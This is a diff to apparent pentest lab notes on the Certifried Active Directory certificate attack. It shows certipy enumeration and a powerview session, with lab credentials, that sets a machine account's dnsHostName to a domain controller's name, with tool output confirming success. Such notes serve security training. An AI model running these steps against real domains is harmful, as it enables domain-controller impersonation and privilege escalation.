@@ -34,13 +34,13 @@ certipy find -u 'BlWasp@lab.local' -p 'Password123!' -stdout -vulnerable
 
 Edit dnsHostName with powerview
 
-```sh
-┌──(mczen㉿mczen)-[~/Dropbox/Win]
-└─$ powerview lab.local/BlWasp:'Password123!'@10.129.228.237 
+```bash
+powerview lab.local/BlWasp:'Password123!'@10.129.228.237 
 Logging directory is set to /home/mczen/.powerview/logs/lab-blwasp-10.129.228.237
 [2025-01-31 18:51:15] [Storage] Using cache directory: /home/mczen/.powerview/storage/ldap_cache
 (LDAPS)-[DC02.lab.local]-[LAB-DC\blwasp]
-PV > Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"
+
+Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"
 [2025-01-31 18:51:33] [Set-DomainObject] Success! modified attribute dnshostname for CN=CERTIFRIED,CN=Computers,DC=lab,DC=local
 (LDAPS)-[DC02.lab.local]-[LAB-DC\blwasp]
 ```
